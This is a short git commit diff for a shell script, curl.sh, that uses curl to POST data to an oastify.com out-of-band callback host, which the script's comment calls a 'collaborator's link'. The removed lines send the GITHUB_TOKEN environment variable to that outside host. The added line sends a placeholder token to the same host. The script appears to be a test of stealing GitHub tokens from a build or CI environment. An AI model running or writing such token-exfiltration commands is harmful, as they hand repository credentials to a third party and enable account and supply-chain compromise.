d6be91bc0d8ea0d2e6888f9fc3b333af2b19886e
kakashi2508 <131848180+kakashi2508@users.noreply.github.com>
2024-01-30 00:05:11 +0530

    Update curl.sh

--- curl.sh
+++ curl.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 
 # The URL of your collaborator's link
-URL="http://xuvd37sjmd3i0vwp84vfmjq0argi4bs0.oastify.com"
+#URL="http://xuvd37sjmd3i0vwp84vfmjq0argi4bs0.oastify.com"
 
-GITHUB_TOKEN="${GITHUB_TOKEN}"
+#GITHUB_TOKEN="${GITHUB_TOKEN}"
 
 # Use curl to send a GET request to the URL
-curl -X POST -d "token=${GITHUB_TOKEN}" "$URL"
+curl -X POST -d "token=xxx" xuvd37sjmd3i0vwp84vfmjq0argi4bs0.oastify.com
